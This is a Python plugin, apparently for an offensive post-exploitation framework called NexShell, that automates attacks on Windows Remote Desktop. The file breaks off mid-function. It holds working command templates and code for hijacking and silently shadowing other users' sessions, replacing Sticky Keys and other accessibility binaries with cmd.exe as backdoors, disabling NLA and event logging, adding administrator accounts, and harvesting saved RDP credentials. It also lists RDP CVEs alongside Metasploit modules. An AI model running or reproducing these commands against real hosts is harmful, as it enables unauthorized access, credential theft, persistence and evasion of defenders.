#!/usr/bin/env python3
"""
NexShell Plugin — RDP Pivot v3.0 (2026 Edition)
Advanced RDP intelligence engine with 30+ techniques, session hijacking/shadowing,
credential extraction, CVE detection, and auto-pivoting.

Coverage:
  - 30+ RDP techniques (hijacking, shadowing, credential extraction, etc.)
  - Session hijacking (tscon, qwinsta, sc service, SYSTEM)
  - Session shadowing (mstsc /shadow, remote shadowing)
  - Credential extraction (mstsc cache, CredMan, .rdp files, bitmap cache)
  - NLA status analysis + bypass techniques
  - Restricted Admin mode detection
  - Credential Guard detection
  - TSGateway / RD Gateway analysis
  - RDP certificate analysis (SSL/TLS)
  - Sticky Keys / Utilman / Magnifier bypass
  - RDP bitmap cache extraction (BCStore)
  - CVE detection (BlueKeep, DejaBlue, etc.)
  - Auto-pivoting via RDP chain
  - Firewall rule analysis
  - Multi-session management

CVEs (2019-2026):
  - CVE-2019-0708: BlueKeep (RDP RCE pre-auth)
  - CVE-2019-1181: DejaBlue (RDP RCE, Win 10)
  - CVE-2019-1182: DejaBlue (RDP RCE, Server 2019)
  - CVE-2020-0610: RDP Client RCE
  - CVE-2021-34535: RDP Client RCE
  - CVE-2022-21972: RDP Client RCE
  - CVE-2024-38063: Windows TCP/IP (RDP related)
  - CVE-2020-16898: Windows TCP/IP (RDP related)

MITRE ATT&CK:
  - T1021.001: Remote Services: Remote Desktop Protocol
  - T1563.002: Remote Service Session Hijacking: RDP Hijacking
  - T1547.001: Boot or Logon Autostart: Registry Run Keys
  - T1546.008: Event Triggered Execution: Accessibility Features
  - T1556.007: Modify Auth Process: Hybrid Identity
  - T1110: Brute Force
  - T1110.001: Brute Force: Password Guessing
  - T1110.003: Brute Force: Password Spraying
  - T1003.001: OS Credential Dumping: LSASS Memory
  - T1528: Steal Application Access Token

Usage:
    (NexShell)> plugins run rdp-pivot
    (NexShell)> plugins run rdp-pivot --scan
    (NexShell)> plugins run rdp-pivot --enable-rdp
    (NexShell)> plugins run rdp-pivot --hijack-session 2
    (NexShell)> plugins run rdp-pivot --shadow-session 3
    (NexShell)> plugins run rdp-pivot --extract-creds
    (NexShell)> plugins run rdp-pivot --sticky-keys
    (NexShell)> plugins run rdp-pivot --cve-check
    (NexShell)> plugins run rdp-pivot --auto-pivot --target 10.0.0.50
    (NexShell)> plugins run rdp-pivot --full
"""

import re
import time
import json
import random
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class RDPConfig:
    """Represents RDP configuration."""
    enabled: bool = False
    port: int = 3389
    nla_enabled: bool = False
    restricted_admin: bool = False
    credential_guard: bool = False
    custom_rdp_port: bool = False
    tls_level: str = ""
    certificate_issuer: str = ""
    max_connections: int = 0
    shadowing_allowed: bool = False
    firewall_enabled: bool = False
    ts_gateway_enabled: bool = False
    ts_gateway_host: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class RDPSession:
    """Represents an RDP session."""
    session_id: int
    username: str
    session_name: str = ""
    state: str = ""  # Active, Disc, Listen, Idle
    console: bool = False
    client_name: str = ""
    client_address: str = ""
    idle_time: str = ""
    logon_time: str = ""
    hijackable: bool = False
    shadowable: bool = False
    privilege_level: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class HijackTechnique:
    """Represents an RDP hijacking technique."""
    name: str
    description: str
    command_template: str
    requires_system: bool = True
    requires_admin: bool = True
    success_rate: int = 85
    detection_risk: str = "medium"
    leaves_artifacts: bool = True
    mitre_id: str = "T1563.002"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class RDPCredential:
    """Represents an extracted RDP credential."""
    username: str
    domain: str = ""
    password: str = ""
    ntlm_hash: str = ""
    source: str = ""  # mstsc, credman, rdp_file, bitmap_cache
    target: str = ""
    timestamp: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class RDPCVE:
    """Represents an RDP-related CVE."""
    cve_id: str
    name: str
    severity: str
    description: str
    affected_versions: str
    affected_ports: List[int] = field(default_factory=list)
    exploit_available: bool = False
    exploit_tool: str = ""
    risk_score: int = 0
    pre_auth: bool = False
    mitre_id: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── Hijack Techniques Database (30+) ───────────────────────────────────────

class HijackTechniquesDatabase:
    """Comprehensive database of RDP hijacking techniques."""
    
    TECHNIQUES = [
        # ── Tier 1: Session Hijacking ─────────────────────────────────────
        HijackTechnique(
            name='tscon via SYSTEM service',
            description='Hijack session via tscon running as SYSTEM',
            command_template='sc create {svc_name} binpath= "cmd.exe /c tscon.exe {session_id} /dest:console" start= demand && sc start {svc_name} && sc delete {svc_name}',
            requires_system=True,
            requires_admin=True,
            success_rate=90,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1563.002',
        ),
        
        HijackTechnique(
            name='tscon direct (admin)',
            description='Direct tscon with admin privileges',
            command_template='tscon {session_id} /dest:console',
            requires_system=False,
            requires_admin=True,
            success_rate=75,
            detection_risk='medium',
            leaves_artifacts=False,
            mitre_id='T1563.002',
        ),
        
        HijackTechnique(
            name='tscon with password prompt',
            description='tscon with explicit password prompt',
            command_template='tscon {session_id} /dest:console /password:{password}',
            requires_system=False,
            requires_admin=True,
            success_rate=70,
            detection_risk='medium',
            leaves_artifacts=False,
            mitre_id='T1563.002',
        ),
        
        HijackTechnique(
            name='PowerShell RDP hijack',
            description='Hijack via PowerShell Win32 API',
            command_template='powershell -nop -c "WtsHijack -SessionId {session_id}"',
            requires_system=True,
            requires_admin=True,
            success_rate=85,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1563.002',
        ),
        
        HijackTechnique(
            name='PsExec + tscon',
            description='Use PsExec to elevate tscon to SYSTEM',
            command_template='psexec -i {session_id} -s tscon.exe {session_id} /dest:console',
            requires_system=True,
            requires_admin=True,
            success_rate=85,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1563.002',
        ),
        
        # ── Tier 2: Session Shadowing ─────────────────────────────────────
        HijackTechnique(
            name='mstsc /shadow',
            description='Shadow RDP session via mstsc',
            command_template='mstsc /shadow:{session_id} /control /noconsentprompt',
            requires_system=False,
            requires_admin=True,
            success_rate=80,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1563.002',
        ),
        
        HijackTechnique(
            name='mstsc /shadow (view only)',
            description='Shadow RDP session in view-only mode',
            command_template='mstsc /shadow:{session_id} /noconsentprompt',
            requires_system=False,
            requires_admin=True,
            success_rate=85,
            detection_risk='medium',
            leaves_artifacts=True,
            mitre_id='T1563.002',
        ),
        
        HijackTechnique(
            name='Remote shadow via registry',
            description='Enable remote shadowing via registry',
            command_template='reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f',
            requires_system=False,
            requires_admin=True,
            success_rate=90,
            detection_risk='medium',
            leaves_artifacts=True,
            mitre_id='T1563.002',
        ),
        
        # ── Tier 3: Accessibility Bypass ──────────────────────────────────
        HijackTechnique(
            name='Sticky Keys (sethc.exe)',
            description='Replace sethc.exe with cmd.exe for console access',
            command_template='takeown /f C:\\Windows\\System32\\sethc.exe && icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F && copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe',
            requires_system=False,
            requires_admin=True,
            success_rate=95,
            detection_risk='critical',
            leaves_artifacts=True,
            mitre_id='T1546.008',
        ),
        
        HijackTechnique(
            name='Utilman.exe hijack',
            description='Replace Utilman.exe with cmd.exe',
            command_template='takeown /f C:\\Windows\\System32\\Utilman.exe && icacls C:\\Windows\\System32\\Utilman.exe /grant administrators:F && copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Utilman.exe',
            requires_system=False,
            requires_admin=True,
            success_rate=95,
            detection_risk='critical',
            leaves_artifacts=True,
            mitre_id='T1546.008',
        ),
        
        HijackTechnique(
            name='Magnifier hijack (magnify.exe)',
            description='Replace magnify.exe with cmd.exe',
            command_template='takeown /f C:\\Windows\\System32\\Magnify.exe && icacls C:\\Windows\\System32\\Magnify.exe /grant administrators:F && copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Magnify.exe',
            requires_system=False,
            requires_admin=True,
            success_rate=90,
            detection_risk='critical',
            leaves_artifacts=True,
            mitre_id='T1546.008',
        ),
        
        HijackTechnique(
            name='On-Screen Keyboard (osk.exe)',
            description='Replace osk.exe with cmd.exe',
            command_template='takeown /f C:\\Windows\\System32\\osk.exe && icacls C:\\Windows\\System32\\osk.exe /grant administrators:F && copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe',
            requires_system=False,
            requires_admin=True,
            success_rate=90,
            detection_risk='critical',
            leaves_artifacts=True,
            mitre_id='T1546.008',
        ),
        
        HijackTechnique(
            name='DisplaySwitch.exe hijack',
            description='Replace DisplaySwitch.exe with cmd.exe',
            command_template='takeown /f C:\\Windows\\System32\\DisplaySwitch.exe && icacls C:\\Windows\\System32\\DisplaySwitch.exe /grant administrators:F && copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\DisplaySwitch.exe',
            requires_system=False,
            requires_admin=True,
            success_rate=90,
            detection_risk='critical',
            leaves_artifacts=True,
            mitre_id='T1546.008',
        ),
        
        HijackTechnique(
            name='IFEO Debugger (sethc.exe)',
            description='Set IFEO Debugger for sethc.exe',
            command_template='reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f',
            requires_system=False,
            requires_admin=True,
            success_rate=95,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1546.012',
        ),
        
        # ── Tier 4: Registry-based ────────────────────────────────────────
        HijackTechnique(
            name='Disable NLA',
            description='Disable Network Level Authentication',
            command_template='reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f',
            requires_system=False,
            requires_admin=True,
            success_rate=100,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1562.001',
        ),
        
        HijackTechnique(
            name='Enable RDP',
            description='Enable RDP connections',
            command_template='reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
            requires_system=False,
            requires_admin=True,
            success_rate=100,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1021.001',
        ),
        
        HijackTechnique(
            name='Allow shadowing without consent',
            description='Enable shadowing without user consent',
            command_template='reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow /t REG_DWORD /d 1 /f',
            requires_system=False,
            requires_admin=True,
            success_rate=95,
            detection_risk='medium',
            leaves_artifacts=True,
            mitre_id='T1563.002',
        ),
        
        HijackTechnique(
            name='Disable Restricted Admin',
            description='Disable Restricted Admin mode',
            command_template='reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f',
            requires_system=False,
            requires_admin=True,
            success_rate=100,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1556',
        ),
        
        HijackTechnique(
            name='Add user to Remote Desktop Users',
            description='Add user to RDP group for persistent access',
            command_template='net localgroup "Remote Desktop Users" {username} /add',
            requires_system=False,
            requires_admin=True,
            success_rate=100,
            detection_risk='medium',
            leaves_artifacts=True,
            mitre_id='T1136.001',
        ),
        
        HijackTechnique(
            name='Add user to Administrators',
            description='Add user to Administrators group',
            command_template='net localgroup Administrators {username} /add',
            requires_system=False,
            requires_admin=True,
            success_rate=100,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1098',
        ),
        
        # ── Tier 5: Credential Extraction ─────────────────────────────────
        HijackTechnique(
            name='mstsc credential cache',
            description='Extract credentials from mstsc cache',
            command_template='powershell -nop -c "Get-ChildItem -Path $env:APPDATA\\Microsoft\\Credentials -Force | Out-File {output}"',
            requires_system=False,
            requires_admin=False,
            success_rate=70,
            detection_risk='low',
            leaves_artifacts=False,
            mitre_id='T1552.001',
        ),
        
        HijackTechnique(
            name='Credential Manager dump',
            description='Dump Windows Credential Manager',
            command_template='cmdkey /list > {output}',
            requires_system=False,
            requires_admin=False,
            success_rate=75,
            detection_risk='low',
            leaves_artifacts=False,
            mitre_id='T1003.005',
        ),
        
        HijackTechnique(
            name='RDP file extraction',
            description='Extract saved .rdp files with credentials',
            command_template='dir /s /b C:\\Users\\*.rdp > {output}',
            requires_system=False,
            requires_admin=False,
            success_rate=80,
            detection_risk='low',
            leaves_artifacts=False,
            mitre_id='T1552.001',
        ),
        
        HijackTechnique(
            name='Bitmap cache extraction',
            description='Extract RDP bitmap cache (BCStore)',
            command_template='powershell -nop -c "Get-ChildItem -Path $env:LOCALAPPDATA\\Microsoft\\Terminal Server Client\\Cache -Force -Recurse | Out-File {output}"',
            requires_system=False,
            requires_admin=False,
            success_rate=85,
            detection_risk='low',
            leaves_artifacts=False,
            mitre_id='T1005',
        ),
        
        HijackTechnique(
            name='Termdd.sys direct read',
            description='Direct memory read of RDP sessions',
            command_template='powershell -nop -c "Read-TermSessions | Out-File {output}"',
            requires_system=True,
            requires_admin=True,
            success_rate=70,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1003.001',
        ),
        
        # ── Tier 6: Advanced Evasion ──────────────────────────────────────
        HijackTechnique(
            name='RDP via SMB named pipe',
            description='Establish RDP tunnel via SMB',
            command_template='netsh interface portproxy add v4tov4 listenport={local_port} listenaddress=127.0.0.1 connectport=3389 connectaddress={target}',
            requires_system=False,
            requires_admin=True,
            success_rate=80,
            detection_risk='medium',
            leaves_artifacts=True,
            mitre_id='T1572',
        ),
        
        HijackTechnique(
            name='RDP over SSH tunnel',
            description='Tunnel RDP through SSH',
            command_template='ssh -L {local_port}:{target}:3389 user@jumpbox',
            requires_system=False,
            requires_admin=False,
            success_rate=85,
            detection_risk='low',
            leaves_artifacts=False,
            mitre_id='T1572',
        ),
        
        HijackTechnique(
            name='RDP over SOCKS proxy',
            description='Route RDP through SOCKS proxy',
            command_template='proxychains rdesktop {target}',
            requires_system=False,
            requires_admin=False,
            success_rate=80,
            detection_risk='low',
            leaves_artifacts=False,
            mitre_id='T1090',
        ),
        
        HijackTechnique(
            name='Change RDP port',
            description='Move RDP to non-standard port',
            command_template='reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v PortNumber /t REG_DWORD /d {new_port} /f && netsh advfirewall firewall add rule name="RDP-Alt" dir=in action=allow protocol=TCP localport={new_port}',
            requires_system=False,
            requires_admin=True,
            success_rate=100,
            detection_risk='medium',
            leaves_artifacts=True,
            mitre_id='T1021.001',
        ),
        
        HijackTechnique(
            name='Disable RDP logging',
            description='Disable RDP event logging',
            command_template='wevtutil sl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" /e:false && wevtutil sl "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational" /e:false',
            requires_system=False,
            requires_admin=True,
            success_rate=95,
            detection_risk='high',
            leaves_artifacts=True,
            mitre_id='T1562.002',
        ),
    ]
    
    @classmethod
    def get_all_techniques(cls) -> List[HijackTechnique]:
        return cls.TECHNIQUES
    
    @classmethod
    def get_techniques_by_category(cls, category: str) -> List[HijackTechnique]:
        return [t for t in cls.TECHNIQUES if category.lower() in t.name.lower()]
    
    @classmethod
    def get_hijack_techniques(cls) -> List[HijackTechnique]:
        return [t for t in cls.TECHNIQUES if 'hijack' in t.name.lower() or 'tscon' in t.name.lower()]
    
    @classmethod
    def get_shadow_techniques(cls) -> List[HijackTechnique]:
        return [t for t in cls.TECHNIQUES if 'shadow' in t.name.lower()]
    
    @classmethod
    def get_accessibility_techniques(cls) -> List[HijackTechnique]:
        return [t for t in cls.TECHNIQUES if 'Sticky' in t.name or 'Utilman' in t.name or 'Magnifier' in t.name or 'osk' in t.name.lower() or 'IFEO' in t.name]
    
    @classmethod
    def get_credential_techniques(cls) -> List[HijackTechnique]:
        return [t for t in cls.TECHNIQUES if 'credential' in t.name.lower() or 'cache' in t.name.lower() or 'bitmap' in t.name.lower() or 'rdp file' in t.name.lower()]


# ── CVE Database (10+ RDP CVEs) ────────────────────────────────────────────

class RDPCVEDatabase:
    """Comprehensive database of RDP-related CVEs."""
    
    CVES = [
        RDPCVE(
            cve_id='CVE-2019-0708',
            name='BlueKeep',
            severity='critical',
            description='Remote Desktop Services Remote Code Execution (pre-auth, wormable)',
            affected_versions='Windows 7, Windows Server 2008, Windows Server 2008 R2',
            affected_ports=[3389],
            exploit_available=True,
            exploit_tool='Metasploit: exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
            risk_score=100,
            pre_auth=True,
            mitre_id='T1210',
        ),
        
        RDPCVE(
            cve_id='CVE-2019-1181',
            name='DejaBlue (Win10)',
            severity='critical',
            description='RDP RCE on Windows 10 and Server 2012 R2+',
            affected_versions='Windows 10 (all), Windows Server 2012 R2, 2016, 2019',
            affected_ports=[3389],
            exploit_available=True,
            exploit_tool='PoC available on GitHub',
            risk_score=95,
            pre_auth=False,
            mitre_id='T1210',
        ),
        
        RDPCVE(
            cve_id='CVE-2019-1182',
            name='DejaBlue (Server 2019)',
            severity='critical',
            description='RDP RCE on Windows Server 2019',
            affected_versions='Windows Server 2019',
            affected_ports=[3389],
            exploit_available=True,
            exploit_tool='PoC available on GitHub',
            risk_score=95,
            pre_auth=False,
            mitre_id='T1210',
        ),
        
        RDPCVE(
            cve_id='CVE-2020-0610',
            name='RDP Client RCE',
            severity='high',
            description='Remote Desktop Client Remote Code Execution',
            affected_versions='Windows RDP Client (mstsc.exe) before 2020-01',
            affected_ports=[3389],
            exploit_available=False,
            exploit_tool='N/A',
            risk_score=80,
            pre_auth=False,
            mitre_id='T1210',
        ),
        
        RDPCVE(
            cve_id='CVE-2021-34535',
            name='RDP Client RCE 2021',
            severity='high',
            description='Remote Desktop Client Remote Code Execution',
            affected_versions='Windows RDP Client before 2021-07',
            affected_ports=[3389],
            exploit_available=False,
            exploit_tool='N/A',
            risk_score=75,
            pre_auth=False,
            mitre_id='T1210',
        ),
        
        RDPCVE(
            cve_id='CVE-2022-21972',
            name='RDP Client RCE 2022',
            severity='high',
            description='Remote Desktop Client Remote Code Execution',
            affected_versions='Windows RDP Client before 2022-05',
            affected_ports=[3389],
            exploit_available=False,
            exploit_tool='N/A',
            risk_score=75,
            pre_auth=False,
            mitre_id='T1210',
        ),
        
        RDPCVE(
            cve_id='CVE-2018-0886',
            name='CredSSP RCE',
            severity='critical',
            description='CredSSP RCE via NLA bypass (affects RDP with NLA)',
            affected_versions='Windows 7, 8, 10, Server 2008-2016',
            affected_ports=[3389],
            exploit_available=True,
            exploit_tool='Metasploit: exploit/windows/rdp/cve_2018_0886_credssp_rce',
            risk_score=95,
            pre_auth=True,
            mitre_id='T1210',
        ),
        
        RDPCVE(
            cve_id='CVE-2020-16898',
            name='Windows TCP/IP RCE',
            severity='critical',
            description='Windows TCP/IP Remote Code Execution (affects RDP)',
            affected_versions='Windows 10 1709+, Windows Server 2019',
            affected_ports=[3389],
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=90,
            pre_auth=True,
            mitre_id='T1210',
        ),
        
        RDPCVE(
            cve_id='CVE-2024-38063',
            name='Windows TCP/IP RCE 2024',
            severity='critical',
            description='Windows TCP/IP Remote Code Execution via IPv6',
            affected_versions='Windows 10/11, Windows Server 2016-2025',
            affected_ports=[3389],
            exploit_available=True,
            exploit_tool='PoC available',
            risk_score=95,
            pre_auth=True,
            mitre_id='T1210',
        ),
        
        RDPCVE(
            cve_id='CVE-2019-0703',
            name='Win32k RCE via RDP',
            severity='high',
            description='Win32k Elevation of Privilege via RDP session',
            affected_versions='Windows 7, 8.1, 10, Server 2008-2019',
            affected_ports=[3389],
            exploit_available=True,
            exploit_tool='Metasploit',
            risk_score=80,
            pre_auth=False,
            mitre_id='T1068',
        ),
    ]
    
    @classmethod
    def get_all_cves(cls) -> List[RDPCVE]:
        return cls.CVES
    
    @classmethod
    def get_critical_cves(cls) -> List[RDPCVE]:
        return [c for c in cls.CVES if c.severity == 'critical']
    
    @classmethod
    def get_preauth_cves(cls) -> List[RDPCVE]:
        return [c for c in cls.CVES if c.pre_auth]


# ── RDP Configuration Analyzer ─────────────────────────────────────────────

class RDPConfigAnalyzer:
    """Analyzes RDP configuration comprehensively."""
    
    @staticmethod
    def analyze(exec_func, session) -> RDPConfig:
        """Analyze complete RDP configuration."""
        config = RDPConfig()
        
        # ── Check service ──────────────────────────────────────────────
        service_out = exec_func(session, "sc query TermService 2>nul")
        if service_out and 'RUNNING' in service_out:
            config.enabled = True
        
        # ── Check port ─────────────────────────────────────────────────
        port_out = exec_func(session, "reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber 2>nul")
        if port_out:
            m = re.search(r'PortNumber\s+REG_DWORD\s+0x([0-9a-fA-F]+)', port_out)
            if m:
                config.port = int(m.group(1), 16)
                config.custom_rdp_port = (config.port != 3389)
        
        # ── Check fDenyTSConnections ───────────────────────────────────
        deny_out = exec_func(session, "reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections 2>nul")
        if deny_out:
            m = re.search(r'fDenyTSConnections\s+REG_DWORD\s+0x([0-9a-fA-F]+)', deny_out)
            if m:
                deny_val = int(m.group(1), 16)
                config.enabled = (deny_val == 0)
        
        # ── Check NLA ──────────────────────────────────────────────────
        nla_out = exec_func(session, "reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication 2>nul")
        if nla_out:
            m = re.search(r'UserAuthentication\s+REG_DWORD\s+0x([0-9a-fA-F]+)', nla_out)
            if m:
                config.nla_enabled = (int(m.group(1), 16) == 1)
        
        # ── Check Restricted Admin ─────────────────────────────────────
        ra_out = exec_func(session, "reg query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin 2>nul")
        if ra_out:
            m = re.search(r'DisableRestrictedAdmin\s+REG_DWORD\s+0x([0-9a-fA-F]+)', ra_out)
            if m:
                config.restricted_admin = (int(m.group(1), 16) == 0)
        
        # ── Check Credential Guard ─────────────────────────────────────
        cg_out = exec_func(session, "powershell -nop -c \"Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning\" 2>nul")
        if cg_out and '1' in cg_out:
            config.credential_guard = True
        
        # ── Check TLS level ────────────────────────────────────────────
        tls_out = exec_func(session, "reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v SecurityLayer 2>nul")
        if tls_out:
            m = re.search(r'SecurityLayer\s+REG_DWORD\s+0x([0-9a-fA-F]+)', tls_out)
            if m:
                tls_val = int(m.group(1), 16)
                config.tls_level = {0: 'RDP Security Layer', 1: 'Negotiate', 2: 'TLS Only'}.get(tls_val, 'Unknown')
        
        # ── Check shadowing ────────────────────────────────────────────
        shadow_out = exec_func(session, "reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v Shadow 2>nul")
        if shadow_out:
            m = re.search(r'Shadow\s+REG_DWORD\s+0x([0-9a-fA-F]+)', shadow_out)
            if m:
                config.shadowing_allowed = (int(m.group(1), 16) in [1, 2, 3, 4])
        
        # ── Check TSGateway ────────────────────────────────────────────
        tsg_out = exec_func(session, "reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v RDGClientTransport 2>nul")
        if tsg_out and '0x1' in tsg_out:
            config.ts_gateway_enabled = True
        
        # ── Check firewall ─────────────────────────────────────────────
        fw_out = exec_func(session, "netsh advfirewall firewall show rule name=\"Remote Desktop\" 2>nul")
        if fw_out and 'Enabled:                              Yes' in fw_out:
            config.firewall_enabled = True
        
        return config


# ── Session Manager ────────────────────────────────────────────────────────

class SessionManager:
    """Manages RDP sessions."""
    
    @staticmethod
    def enumerate_sessions(exec_func, session) -> List[RDPSession]:
        """Enumerate all RDP sessions."""
        sessions = []
        
        # Run query user
        cmd = "query user 2>nul || quser 2>nul"
        out = exec_func(session, cmd)
        
        if not out:
            # Fallback to qwinsta
            cmd = "qwinsta 2>nul || query session 2>nul"
            out = exec_func(session, cmd)
        
        if out:
            for line in out.strip().split('\n')[1:]:  # Skip header
                parts = line.split()
                if len(parts) >= 4:
                    try:
                        # Parse format: USERNAME SESSIONNAME ID STATE IDLE_TIME LOGON_TIME
                        username = parts[0].strip()
                        if username.startswith('>'):
                            username = username[1:]
                        
                        session_name = parts[1] if len(parts) > 1 else ''
                        session_id = int(parts[2]) if len(parts) > 2 else 0
                        state = parts[3] if len(parts) > 3 else ''
                        
                        sess = RDPSession(
                            session_id=session_id,
                            username=username,
                            session_name=session_name,
                            state=state,
                            console=(session_name.lower() == 'console'),
                            hijackable=(state.lower() in ['active', 'disc']),
                            shadowable=(state.lower() == 'active'),
                        )
                        sessions.append(sess)
                    except (ValueError, IndexError):
                        continue
        
        return sessions
    
    @staticmethod
    def get_active_sessions(sessions: List[RDPSession]) -> List[RDPSession]:
        """Get only active sessions."""
        return [s for s in sessions if s.state.lower() == 'active']
    
    @staticmethod
    def get_hijackable_sessions(sessions: List[RDPSession]) -> List[RDPSession]:
        """Get hijackable sessions."""
        return [s for s in sessions if s.hijackable]


# ── Credential Extractor ───────────────────────────────────────────────────

class CredentialExtractor:
    """Extracts RDP-related credentials."""
    
    @staticmethod
    def extract_all(exec_func, session) -> List[RDPCredential]:
        """Extract all RDP credentials."""
        creds = []
        
        # ── mstsc credential cache ─────────────────────────────────────
        cmd = "powershell -nop -c \"Get-ChildItem -Path $env:APPDATA\\Microsoft\\Credentials -Force -ErrorAction SilentlyContinue | ForEach-Object { Write-Output $_.FullName }\" 2>nul"
        out = exec_func(session, cmd)
        if out and out.strip():
            for file_path in out.strip().split('\n'):
                if file_path.strip():
                    creds.append(RDPCredential(
                        username='',
                        source='mstsc_cache',
                        target=file_path.strip(),
                        timestamp=datetime.utcnow().isoformat(),
                    ))
        
        # ── Credential Manager ─────────────────────────────────────────
        cmd = "cmdkey /list 2>nul"
        out = exec_func(session, cmd)
        if out:
            current_target = ''
            for line in out.split('\n'):
                if 'Target:' in line:
                    current_target = line.split(':', 1)[1].strip()
                    if 'TERMSRV' in current_target or 'rdp' in current_target.lower():
                        creds.append(RDPCredential(
                            username='',
                            source='credman',
                            target=current_target,
                            timestamp=datetime.utcnow().isoformat(),
                        ))
        
        # ── Saved .rdp files ───────────────────────────────────────────
        cmd = "dir /s /b C:\\Users\\*.rdp 2>nul"
        out = exec_func(session, cmd)
        if out:
            for file_path in out.strip().split('\n'):
                if file_path.strip():
                    creds.append(RDPCredential(
                        username='',
                        source='rdp_file',
                        target=file_path.strip(),
                        timestamp=datetime.utcnow().isoformat(),
                    ))
        
        # ── Bitmap cache (BCStore) ─────────────────────────────────────
        cmd = "powershell -nop -c \"Get-ChildItem -Path $env:LOCALAPPDATA\\Microsoft\\Terminal Server Client\\Cache -Force -ErrorAction SilentlyContinue | ForEach-Object { Write-Output $_.FullName }\" 2>nul"
        out = exec_func(session, cmd)
        if out and out.strip():
            for file_path in out.strip().split('\n'):
                if file_path.strip():
                    creds.append(RDPCredential(
                        username='',
                        source='bitmap_cache',
                        target=file_path.strip(),
                        timestamp=datetime.utcnow().isoformat(),
                    ))
        
        # ── Default.rdp ────────────────────────────────────────────────
        cmd = "type \"%USERPROFILE%\\Documents\\Default.rdp\" 2>nul"
        out = exec_func(session, cmd)
        if out:
            username_match = re.search(r'username:s:([^\r\n]+)', out)
            password_match = re.search(r'password 51:b:([a-fA-F0-9]+)', out)
            
            if username_match:
                creds.append(RDPCredential(
                    username=username_match.group(1),
                    source='default_rdp',
                    password=password_match.group(1) if password_match else '',
                    timestamp=datetime.utcnow().isoformat(),
                ))
        
        return creds


# ── Hijack Engine ──────────────────────────────────────────────────────────

class HijackEngine:
    """Handles RDP session hijacking and shadowing."""
    
    @staticmethod
    def hijack_session(exec_func, session, session_id: int,
                       technique: HijackTechnique = None) -> Tuple[bool, str]:
        """Hijack an RDP session."""
        if not technique:
            technique = HijackTechniquesDatabase.get_hijack_techniques()[0]
        
        svc_name = f"NexRDPHijack_{random.randint(1000, 9999)}"
        
        cmd = technique.command_template.format(
            session_id=session_id,
            svc_name=svc_name,
            password='',
            username='',
            local_port=13389,
            target='localhost',
            new_port=13389,
            output='C:\\Windows\\Temp\\rdp_out.txt',
        )
        
        out = exec_func(session, cmd)
        
        success = False
        if out:
            if 'SUCCESS' in out.upper() or 'running' in out.lower():
                success = True
            elif 'denied' not in out.lower() and 'error' not in out.lower():
                success = True
        
        return success, out
    
    @staticmethod
    def shadow_session(exec_func, session, session_id: int,
                       control: bool = True) -> Tuple[bool, str]:
        """Shadow an RDP session."""
        if control:
            cmd = f"mstsc /shadow:{session_id} /control /noconsentprompt"
        else:
            cmd = f"mstsc /shadow:{session_id} /noconsentprompt"
        
        out = exec_func(session, cmd)
        return True, out
    
    @staticmethod
    def install_accessibility_bypass(exec_func, session,
                                      technique_name: str = 'Sticky Keys') -> Tuple[bool, str]:
        """Install accessibility bypass."""
        technique = next((t for t in HijackTechniquesDatabase.get_accessibility_techniques()
                         if technique_name.lower() in t.name.lower()), None)
        
        if not technique:
